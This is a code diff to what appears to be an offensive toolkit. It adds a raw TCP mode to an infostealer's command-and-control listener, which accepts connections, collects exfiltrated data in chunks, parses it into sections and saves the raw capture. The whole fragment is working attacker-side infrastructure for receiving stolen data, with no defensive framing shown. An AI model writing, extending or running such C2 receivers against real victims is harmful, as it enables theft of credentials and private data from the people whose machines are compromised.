@@ -311,8 +311,13 @@ def parse_exfil_sections(data: bytes, out_dir: Path):
 
 def run_infostealer_c2(port: int, timeout: int, out_dir: Path, protocol: str = "http") -> bool:
     """Run C2 listener for infostealer, collect and parse exfil."""
-    from http.server import HTTPServer
+    import socket
     import ssl
+    from http.server import HTTPServer
+
+    # TCP raw socket mode
+    if protocol == "tcp":
+        return run_tcp_listener(port, timeout, out_dir)
 
     InfostealerC2Handler.exfil_data = bytearray()
     InfostealerC2Handler.received_chunks = 0
@@ -360,6 +365,59 @@ def run_infostealer_c2(port: int, timeout: int, out_dir: Path, protocol: str = "
         return False
 
     print(f"\n\n  Total received: {len(data):,} bytes in {InfostealerC2Handler.received_chunks} chunks")
+    print(f"\n  Parsing exfil data...")
+
+    exfil_dir = out_dir / "exfil"
+    parse_exfil_sections(data, exfil_dir)
+
+    raw_file = exfil_dir / "raw_complete.bin"
+    raw_file.write_bytes(data)
+    print(f"    Complete raw data -> {raw_file.name}")
+
+    return True
+
+
+def run_tcp_listener(port: int, timeout: int, out_dir: Path) -> bool:
+    """Run raw TCP listener for tcp_direct exfil."""
+    import socket
+
+    print(f"\n  C2 TCP listening on 0.0.0.0:{port}")
+    print(f"  Waiting for exfil (timeout: {timeout}s)...")
+
+    data = bytearray()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(("0.0.0.0", port))
+    sock.listen(1)
+    sock.settimeout(timeout)
+
+    try:
+        conn, addr = sock.accept()
+        print(f"  Connection from {addr[0]}:{addr[1]}")
+        conn.settimeout(30)
+
+        while True:
+            try:
+                chunk = conn.recv(4096)
+                if not chunk:
+                    break
+                data.extend(chunk)
+                print(f"\r  Received: {len(data):,} bytes", end="", flush=True)
+            except socket.timeout:
+                break
+
+        conn.close()
+    except socket.timeout:
+        print("\n  No connection received")
+    finally:
+        sock.close()
+
+    if not data:
+        print("\n  No data received")
+        return False
+
+    print(f"\n\n  Total received: {len(data):,} bytes")
     print(f"\n  Parsing exfil data...")
 
     exfil_dir = out_dir / "exfil"
